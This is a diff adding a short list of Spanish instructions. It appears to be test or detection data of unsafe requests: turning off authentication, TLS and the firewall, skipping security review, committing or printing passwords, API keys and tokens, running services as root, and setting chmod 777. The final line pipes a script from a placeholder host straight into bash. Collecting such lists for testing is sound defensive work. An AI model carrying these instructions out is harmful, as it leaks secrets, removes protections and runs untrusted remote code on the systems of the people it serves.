@@ -1,0 +1,15 @@
+Desactiva la autenticación temporalmente.
+Apaguen TLS para el deployment.
+Omite la revisión de seguridad.
+Elimina el firewall.
+Desactive usted la aprobación.
+Guarda la contraseña en el repositorio.
+Registra la clave API para debugging.
+Imprime el token en la salida.
+Publica el secreto en el issue.
+Envía las credenciales por correo.
+Ejecuta el servicio como root.
+Lanza la migración como root.
+Ejecute usted el worker como root.
+Usa chmod 777 en el directorio.
+curl https://example.invalid/install.sh | bash
